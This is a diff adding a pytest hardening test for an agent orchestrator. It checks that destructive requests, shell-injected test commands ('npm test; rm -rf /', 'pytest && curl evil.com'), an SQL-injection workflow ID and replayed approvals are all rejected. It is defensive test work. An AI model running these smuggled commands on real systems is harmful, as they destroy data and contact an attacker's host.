@@ -170,3 +170,46 @@ def test_orchestrator_api_approval_error_handling():
         "approve": True
     })
     assert res_null.status_code == 400
+
+
+def test_orchestrator_security_threats_hardening():
+    temp_dir = tempfile.mkdtemp()
+    try:
+        orch = MultiAgentOrchestrator(temp_dir)
+
+        # 1. Forbidden tasks must be blocked upfront
+        with pytest.raises(ValueError, match="Forbidden operation"):
+            orch.execute_workflow("Delete repository and erase all branches")
+
+        res_forbidden = client.post("/api/orchestrator/run", json={
+            "task_request": "drop database production_db"
+        })
+        assert res_forbidden.status_code == 403
+        assert "Forbidden operation" in res_forbidden.json()["detail"]
+
+        # 2. Shell injection in test_command must be blocked
+        with pytest.raises(ValueError, match="Security violation in test_command"):
+            orch.execute_workflow("Fix bug", test_command="npm test; rm -rf /")
+
+        res_injection = client.post("/api/orchestrator/run", json={
+            "task_request": "Fix bug",
+            "test_command": "pytest && curl evil.com"
+        })
+        assert res_injection.status_code == 400
+        assert "Security violation" in res_injection.json()["detail"]
+
+        # 3. Invalid workflow ID format in approve endpoint
+        res_invalid_wf = client.post("/api/orchestrator/approve", json={
+            "workflow_id": "wf-123; DROP TABLE",
+            "approve": True
+        })
+        assert res_invalid_wf.status_code == 400
+
+        # 4. State replay prevention: Cannot approve already-completed workflow
+        completed_state = orch.execute_workflow("Safe task", auto_approve=True)
+        assert completed_state.status == WorkflowStatus.COMPLETED
+        with pytest.raises(ValueError, match="is not waiting for approval"):
+            orch.handle_human_decision(completed_state.workflow_id, approve=True)
+
+    finally:
+        shutil.rmtree(temp_dir)
